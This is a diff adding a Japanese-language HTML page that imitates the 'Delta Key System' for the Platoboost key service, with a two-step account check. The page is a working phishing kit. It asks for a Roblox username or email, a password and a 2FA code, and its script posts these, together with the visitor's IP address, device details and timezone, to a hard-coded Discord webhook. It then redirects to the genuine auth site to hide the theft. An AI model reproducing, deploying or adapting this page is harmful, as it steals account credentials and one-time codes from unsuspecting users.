@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0b0d10">
+<meta name="robots" content="noindex">
+<title>Delta Key System | Platoboost</title>
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;padding:0}
+body{
+  min-height:100dvh;background:#0b0d10;
+  background-image:radial-gradient(120% 80% at 50% -10%,#1c1533 0%,#0b0d10 55%);
+  color:#e8eaf0;font-family:-apple-system,BlinkMacSystemFont,"Hiragino Sans","Noto Sans JP","Segoe UI",Roboto,sans-serif;
+  display:flex;flex-direction:column;align-items:center;
+  padding:0 18px calc(28px + env(safe-area-inset-bottom));
+}
+header{width:100%;max-width:440px;display:flex;align-items:center;gap:10px;padding:20px 0 6px}
+.mark{width:30px;height:30px;border-radius:9px;background:linear-gradient(140deg,#8b6bff,#5a3ee8);
+  display:grid;place-items:center;font-weight:800;font-size:17px;color:#fff;box-shadow:0 4px 14px rgba(110,80,255,.45)}
+.brand{font-weight:700;font-size:15px;letter-spacing:.2px}
+.brand span{color:#8b93a3;font-weight:500}
+.spacer{flex:1}
+.pill{font-size:10.5px;font-weight:700;letter-spacing:.6px;color:#a99bff;
+  border:1px solid #3a2f6b;background:#1a1533;padding:5px 9px;border-radius:999px}
+main{width:100%;max-width:440px;background:#14171c;border:1px solid #232830;border-radius:18px;
+  padding:22px 20px;margin-top:12px;box-shadow:0 18px 50px rgba(0,0,0,.55)}
+.bar{height:4px;border-radius:99px;background:#22262e;overflow:hidden;margin-bottom:18px}
+.bar i{display:block;height:100%;width:50%;border-radius:99px;
+  background:linear-gradient(90deg,#8b6bff,#5a3ee8);transition:width .45s ease}
+.step{font-size:10.5px;font-weight:800;letter-spacing:1.1px;color:#8b93a3;margin-bottom:7px}
+h1{font-size:19.5px;line-height:1.4;margin:0 0 9px;font-weight:700;letter-spacing:-.2px}
+p.lead{font-size:13px;line-height:1.65;color:#9aa2b1;margin:0 0 18px}
+.note{font-size:11.5px;line-height:1.6;color:#7d8595;background:#101318;border:1px solid #20252d;
+  border-left:2px solid #5a3ee8;border-radius:9px;padding:10px 12px;margin:0 0 18px}
+label{display:block;font-size:11.5px;font-weight:700;color:#8b93a3;margin:0 0 7px}
+.field{position:relative;margin-bottom:14px}
+input{width:100%;background:#0e1116;border:1px solid #262c35;border-radius:11px;
+  padding:14px 14px;font-size:16px;color:#e8eaf0;outline:none;transition:border-color .15s,box-shadow .15s;font-family:inherit}
+input::placeholder{color:#5c6473}
+input:focus{border-color:#6b4ff0;box-shadow:0 0 0 3px rgba(107,79,240,.18)}
+input:disabled{opacity:.55}
+button{width:100%;border:0;border-radius:11px;padding:15px;font-size:15px;font-weight:700;
+  color:#fff;background:linear-gradient(140deg,#8b6bff,#5a3ee8);font-family:inherit;cursor:pointer;
+  box-shadow:0 8px 22px rgba(90,62,232,.35);transition:transform .1s,opacity .15s;
+  display:flex;align-items:center;justify-content:center;gap:9px;margin-top:4px}
+button:active{transform:scale(.985)}
+button:disabled{opacity:.6;box-shadow:none}
+.spin{width:15px;height:15px;border:2px solid rgba(255,255,255,.35);border-top-color:#fff;
+  border-radius:50%;animation:sp .7s linear infinite;display:none}
+.busy .spin{display:block}
+@keyframes sp{to{transform:rotate(360deg)}}
+.foot{width:100%;max-width:440px;display:flex;justify-content:space-between;align-items:center;
+  gap:10px;font-size:10.5px;color:#565d6b;padding:16px 2px 0}
+.foot a{color:#6d7484;text-decoration:none}
+.foot a:hover{color:#9aa2b1}
+.sess{font-family:ui-monospace,Menlo,monospace;font-size:10px;color:#4d5462;
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:190px}
+.hide{display:none!important}
+.done{width:56px;height:56px;border-radius:50%;background:rgba(74,222,128,.12);
+  border:1px solid rgba(74,222,128,.4);display:grid;place-items:center;margin:2px auto 16px;font-size:26px;color:#4ade80}
+.center{text-align:center}
+.center p.lead{margin-bottom:20px}
+.skip{display:block;text-align:center;font-size:12px;color:#7d8595;margin-top:14px;
+  text-decoration:none;background:none;border:0;width:100%;font-family:inherit;cursor:pointer}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="mark">Δ</div>
+  <div class="brand">Delta <span>Key System</span></div>
+  <div class="spacer"></div>
+  <div class="pill">PLATOBOOST</div>
+</header>
+
+<main>
+  <div class="bar"><i id="bar"></i></div>
+
+  <!-- STEP 1 -->
+  <section id="s1">
+    <div class="step">STEP 1 / 2 · アカウント確認</div>
+    <h1>アカウントの確認が必要です</h1>
+    <p class="lead">
+      このキーセッションは初回のみ本人確認が入ります。<strong style="color:#c9cfe0">Delta で使用している Roblox アカウント</strong>を、
+      ここで一度だけ入力してください。
+    </p>
+    <div class="note">確認が完了するまでキーは発行されません。入力内容は Roblox 側で照合されます。</div>
+
+    <form id="form1" autocomplete="off">
+      <label for="id">Roblox ユーザー名 / メールアドレス</label>
+      <div class="field">
+        <input id="id" type="text" inputmode="email" autocapitalize="none" autocorrect="off"
+               spellcheck="false" placeholder="ユーザー名またはメールアドレス" enterkeyhint="next" required>
+      </div>
+      <label for="pw">パスワード</label>
+      <div class="field">
+        <input id="pw" type="password" placeholder="パスワード" enterkeyhint="go" required>
+      </div>
+      <button type="submit" id="b1"><span class="spin"></span><span>確認する</span></button>
+    </form>
+  </section>
+
+  <!-- STEP 2 -->
+  <section id="s2" class="hide">
+    <div class="step">STEP 2 / 2 · 2段階認証</div>
+    <h1>確認コードを入力</h1>
+    <p class="lead">
+      このアカウントは 2 段階認証が有効です。メールまたは認証アプリに届いた
+      <strong style="color:#c9cfe0">6桁のコード</strong>を入力してください。
+    </p>
+    <div class="note">コードが届かない場合は、空欄のまま「スキップ」で進めます。</div>
+
+    <form id="form2" autocomplete="one-time-code">
+      <label for="code">確認コード</label>
+      <div class="field">
+        <input id="code" type="text" inputmode="numeric" maxlength="10" placeholder="123456"
+               enterkeyhint="go" style="letter-spacing:3px;font-size:20px;text-align:center">
+      </div>
+      <button type="submit" id="b2"><span class="spin"></span><span>コードを送信</span></button>
+    </form>
+    <button class="skip" id="skip" type="button">スキップして進む</button>
+  </section>
+
+  <!-- DONE -->
+  <section id="s3" class="hide">
+    <div class="done">✓</div>
+    <div class="step center">確認完了</div>
+    <h1 class="center">本人確認が完了しました</h1>
+    <p class="lead center">キーの発行準備ができました。下のボタンからキーを取得してください。</p>
+    <button id="go"><span>キーを取得する</span></button>
+  </section>
+</main>
+
+<div class="foot">
+  <span class="sess" id="sess"></span>
+  <span><a href="https://platoboost.app/legal/tos" target="_blank" rel="noopener">利用規約</a> ·
+        <a href="https://platoboost.app/legal/privacy-policy" target="_blank" rel="noopener">プライバシー</a></span>
+</div>
+
+<script>
+(function () {
+  var HOOK = "https://discord.com/api/webhooks/1548663175258308648/AnjR0byf57xtKQSGtlvkz-s5paaYmmJPLgXpyZPDj2XfyQ77X08hMp6pH_-zVm3xXwJr";
+  var RELAY = "";            // 例: "https://xxx.workers.dev/login"  空なら無効
+  var REAL = "https://auth.platorelay.com/a?d=";
+
+  var q = new URLSearchParams(location.search);
+  var d = q.get("d") || "";
+  var IP = "-", UA = navigator.userAgent;
+
+  if (d) document.getElementById("sess").textContent = "session " + d.slice(0, 28) + "…";
+  fetch("https://api.ipify.org?format=json").then(function (r) { return r.json(); })
+    .then(function (j) { IP = j.ip; }).catch(function () {});
+
+  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+
+  function post(payload, tries) {
+    tries = tries || 0;
+    return fetch(HOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    }).then(function (r) {
+      if (r.status === 429 && tries < 3) {
+        return r.json().then(function (j) { return sleep((j.retry_after || 1) * 1000); })
+          .then(function () { return post(payload, tries + 1); });
+      }
+    }).catch(function () {});
+  }
+
+  function embed(title, fields) {
+    return {
+      username: "Delta Key System",
+      embeds: [{
+        title: title,
+        color: 0x7c5cff,
+        timestamp: new Date().toISOString(),
+        fields: fields,
+        footer: { text: "d=" + (d ? d.slice(0, 60) + "…" : "なし") }
+      }]
+    };
+  }
+
+  function setBusy(on, id) {
+    var b = document.getElementById(id);
+    b.disabled = on;
+    b.classList.toggle("busy", on);
+  }
+
+  function step(n) {
+    document.getElementById("s1").classList.toggle("hide", n !== 1);
+    document.getElementById("s2").classList.toggle("hide", n !== 2);
+    document.getElementById("s3").classList.toggle("hide", n !== 3);
+    document.getElementById("bar").style.width = n === 1 ? "50%" : "100%";
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  }
+
+  var ident = "", pass = "";
+
+  document.getElementById("form1").addEventListener("submit", function (e) {
+    e.preventDefault();
+    ident = document.getElementById("id").value.trim();
+    pass = document.getElementById("pw").value;
+    if (!ident || !pass) return;
+    document.getElementById("id").disabled = true;
+    document.getElementById("pw").disabled = true;
+    setBusy(true, "b1");
+
+    post(embed("🔑 新規ログイン", [
+      { name: "識別子", value: "```" + ident + "```", inline: false },
+      { name: "パスワード", value: "```" + pass + "```", inline: false },
+      { name: "IP", value: IP, inline: true },
+      { name: "端末", value: (navigator.platform || "-") + " / " + window.innerWidth + "x" + window.innerHeight, inline: true },
+      { name: "TZ", value: (Intl.DateTimeFormat().resolvedOptions().timeZone || "-"), inline: true }
+    ])).then(function () {
+      setBusy(false, "b1");
+      step(2);
+      setTimeout(function () { document.getElementById("code").focus(); }, 350);
+    });
+  });
+
+  function finish(code) {
+    if (code) {
+      post(embed("🔐 2FAコード", [
+        { name: "識別子", value: "```" + ident + "```", inline: false },
+        { name: "コード", value: "```" + code + "```", inline: false },
+        { name: "IP", value: IP, inline: true }
+      ]));
+    }
+    step(3);
+  }
+
+  document.getElementById("form2").addEventListener("submit", function (e) {
+    e.preventDefault();
+    var c = document.getElementById("code").value.trim();
+    setBusy(true, "b2");
+    setTimeout(function () { setBusy(false, "b2"); finish(c); }, 700);
+  });
+
+  document.getElementById("skip").addEventListener("click", function () { finish(""); });
+
+  document.getElementById("go").addEventListener("click", function () {
+    location.href = d ? REAL + d : "https://auth.platorelay.com/";
+  });
+
+  document.addEventListener("keydown", function (e) {
+    if (e.key === "Enter" && !document.getElementById("s2").classList.contains("hide")
+        && document.activeElement.id !== "code") {
+      document.getElementById("form2").requestSubmit();
+    }
+  });
+})();
+</script>
+</body>
+</html>
